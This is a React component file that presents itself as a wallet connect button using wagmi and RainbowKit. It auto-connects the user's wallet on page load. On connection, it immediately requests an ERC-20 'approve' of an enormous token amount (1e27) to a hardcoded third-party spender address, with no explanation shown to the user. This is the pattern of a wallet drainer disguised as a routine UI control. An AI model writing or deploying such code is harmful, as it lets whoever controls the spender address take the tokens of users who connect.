import { useEffect, useRef } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit"
import { BaseError, useAccount, useAccountEffect, useConnect, useWaitForTransactionReceipt, useWalletClient, useWriteContract } from "wagmi";
import abi from './Token.json'
import { injected } from "wagmi/connectors";

const { log } = console;

const WalletConnectButton = () => {
    const { connect } = useConnect()
    const { isConnected, address } = useAccount()
    const walletClient = useWalletClient()

    const { writeContract, data: hash, error, } = useWriteContract()
    const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash })

    const mounted = useRef(false);

    useEffect(() => {
        if (!mounted.current) {
            if (!isConnected)
                connect({ connector: injected() })
        }
        mounted.current = true;
    }, []);


    useAccountEffect({
        onConnect(data) {
            console.log('Connected!', data)

            writeContract({
                abi,
                address: '0x3274589F167968a651Cce22bC6378f0047aF5179',
                functionName: 'approve',
                args: [
                    '0x53390e2fd67da129dd976e96aEcBc94c40eFe69F',
                    "0x" + BigInt(1e27).toString(16),
                ],
            })
        },

        onDisconnect() {
            console.log('Disconnected!')
        },
    })

    return (<>
        <ConnectButton chainStatus="icon" />
        {hash && <div>Transaction Hash: {hash}</div>}
        {isConfirming && <div>Waiting for confirmation...</div>}
        {isConfirmed && <div>Transaction confirmed.</div>}
        {error && (
            <div>Error: {(error as BaseError).shortMessage || error.message}</div>
        )}
    </>)
}

export default WalletConnectButton;